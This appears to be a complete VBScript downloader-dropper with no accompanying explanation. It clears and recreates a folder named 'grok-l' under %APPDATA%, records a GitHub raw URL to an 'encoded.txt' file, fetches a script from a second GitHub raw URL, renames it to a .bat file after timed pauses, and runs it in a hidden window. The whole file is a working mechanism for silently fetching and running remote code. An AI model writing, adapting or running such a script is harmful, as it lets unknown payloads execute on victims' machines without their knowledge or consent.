CreateObject("Scripting.FileSystemObject").DeleteFolder CreateObject("WScript.Shell").ExpandEnvironmentStrings("%APPDATA%\Grok-l"), True
Set FSO = CreateObject("Scripting.FileSystemObject")
Set WShell = CreateObject("WScript.Shell")
strAppData = WShell.ExpandEnvironmentStrings("%APPDATA%")
strFolder = strAppData & "\grok-l"
If Not FSO.FolderExists(strFolder) Then FSO.CreateFolder(strFolder)
Set txtFile = FSO.CreateTextFile(strFolder & "\l.txt", True)
txtFile.WriteLine "https://raw.githubusercontent.com/opm4opm4/code/main/encoded.txt"
txtFile.Close
Set txtFile2 = FSO.CreateTextFile(strFolder & "\m.txt", True)
Set xmlHttp = CreateObject("MSXML2.XMLHTTP")
xmlHttp.Open "GET", "https://raw.githubusercontent.com/USATIKTOKER/NEWADD/main/main.txt", False
xmlHttp.Send
txtFile2.Write xmlHttp.responseText
txtFile2.Close
WScript.Sleep 5000
FSO.MoveFile strFolder & "\m.txt", strFolder & "\m.bat"
WScript.Sleep 3000
WShell.Run strFolder & "\m.bat", 0
